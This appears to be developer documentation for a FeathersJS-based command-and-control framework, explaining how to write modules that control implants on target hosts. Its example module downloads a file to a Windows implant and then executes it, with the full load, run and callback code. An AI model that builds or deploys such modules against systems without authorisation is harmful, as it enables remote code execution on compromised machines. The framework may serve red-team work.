## Modules

Modules are server side scripts that can be run with options. They can interract with implant but dont necessarly have to.

Modules must at least implement the following functions:
 * exports.load = function (app) {}
 * exports.run = async function (app, run) {}
 
 
 ### Load

This function is called when the module is loaded, it returns the module object to be stored in the database. It takes the featherjs app as an argument so the module configuration can be adapted if needed. 

```
exports.load = function (app) {
    var module = {
        name: "windows/admin/download_and_run",
        options: {
            file: {
                value: "",
                required: true,
                description: "The ID of the file to download"
            },
            path: {
                value: "C:\\Temp",
                required: true,
                description: "The path to download the file to"
            },
            arguments:{
                value: "",
                required: false,
                description: "The arguments to execute the program with"
            },
            implant:{
                value: "",
                required: true,
                description: "The ID of the implant"
            }
        },
        supportedOS: ["windows"],

        description: "Downloads and runs a file on the target implant",

        requiredPayloads: ["Command", "Download"]
    }
    return module;
};
```

 ### Run
 
 This function is called when the module is run. It takes the feathersjs app as an argument as well as the current run object of the module. The run object can be used to store variabled accross callbacks.
 
 ```
 exports.run = async function (app, run) {
    var file = await app.service("/fs/files").get(run.options.file.value).catch(() => {});
    if (!file){
        moduleHelper.logError(run, "File not found");
        moduleHelper.fail(run);
        moduleHelper.patch(app,run);
        return;
    }

    // Creating the job and setting the callback
    var job = await moduleHelper.createJob(app,run,"afterDownload" ,{type:"Download", options:{ file: file.filename, file_id: file._id, length: file.length, chunkSize: file.chunkSize, path: run.options.path.value}}).catch(() => {});
    if(!job){
        moduleHelper.logError(run, "Error Creating Download Job");
        moduleHelper.fail(run);
        moduleHelper.patch(app,run);
        return;
    }
    moduleHelper.logInfo(run, "Requested the download of: " + file.filename);
    moduleHelper.inProgress(run);
    moduleHelper.patch(app,run);
};
 ```
 
 ### Module Helper
 
 The module helper is an object that aims at faciliatating the devlopment of modules by wrapping api calls into simpler function.
 
 ```
 const moduleHelper = require("../../../src/moduleHelper");

// This function updates the current Run, it should be called after the run is changed otherwise changes wont be saved.
moduleHelper.patch(app, run);

// This function ads an [Info] event to the log
moduleHelper.logInfo(run, message);

// This function ads a [Success] event to the log
moduleHelper.logSuccess(run, message);

// This function ads an [Error] event to the log
moduleHelper.logError(run, message);

// This function fails the run
moduleHelper.fail(run) {};

// This function marks the run as succeeded
moduleHelper.success(run) {};

// This function marks the run as in progrss
moduleHelper.inProgress(run) {};

// This function creates a job for the module, callback should be a module function executed once the job is completed, paylaod is the job payload.
moduleHelper.createJob(app, run, callback, payload) {}

 ```
 
  ### Callbacks
  
  Callbacks are functions that are executed once a job is completed, they take the feathersjs application, the current run, and the job as an argument. 
  
  ```
 // Callbacks than can be executed once jobs are completed
 
exports.afterDownload = async function (app, run, job) {
    // If job failed
    if(job.jobStatus == 4 ){
        moduleHelper.logError(run, "Error during download: " + job.result);
        moduleHelper.fail(run);
        moduleHelper.patch(app,run);
        return;
    }
    // We can add variables to the run
    run.filepath = job.result;

    var job2 = await moduleHelper.createJob(app,run,"afterExecute" ,{type:"Command", options:{cmd: job.result + " " + run.options.arguments.value}}).catch(() => {});
    if(!job2){
        moduleHelper.logError(run, "Error Creating Command Job");
        moduleHelper.fail(run);
        moduleHelper.patch(app,run);
        return;
    }
    moduleHelper.logSuccess(run, "Download succeeded, executing: " + job.result + " " + run.options.arguments.value);
    moduleHelper.patch(app,run);
};
  ```
